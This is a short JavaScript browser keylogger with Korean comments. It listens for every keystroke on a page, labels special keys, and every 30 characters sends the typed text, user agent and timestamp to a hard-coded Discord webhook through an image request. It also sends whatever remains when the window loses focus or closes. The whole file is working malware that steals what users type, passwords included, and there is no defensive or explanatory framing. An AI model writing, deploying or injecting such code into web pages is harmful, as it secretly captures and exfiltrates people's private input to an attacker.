// 키로깅 + Image src를 통한 웹훅 전송

var log = "";
var webhook = "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv";

// 모든 키 입력 감지 + 특수 키 처리
document.addEventListener("keydown", function(e) {
  var key = e.key;

  if (key === "Enter") key = "[ENTER]";
  if (key === "Backspace") key = "[BACKSPACE]";
  if (key === "Tab") key = "[TAB]";
  if (key === " ") key = "[SPACE]";
  if (key.length > 1) key = "[" + key + "]";

  log += key;

  // 30자마다 전송 (GET 요청 활용)
  if (log.length > 30) {
    new Image().src = webhook + "?log=" + encodeURIComponent(log + " | UA: " + navigator.userAgent + " | Time: " + new Date().toLocaleString());
    log = "";
  }
});

// 포커스 잃을 때 남은 로그 전송
window.addEventListener("blur", function() {
  if (log.length > 0) {
    new Image().src = webhook + "?log=" + encodeURIComponent("세션 종료 - 최종 로그: " + log);
    log = "";
  }
});

// 브라우저 종료 시 최종 로그 전송
window.addEventListener("beforeunload", function() {
  if (log.length > 0) {
    new Image().src = webhook + "?log=" + encodeURIComponent("브라우저 종료 - 최종 로그: " + log);
  }
});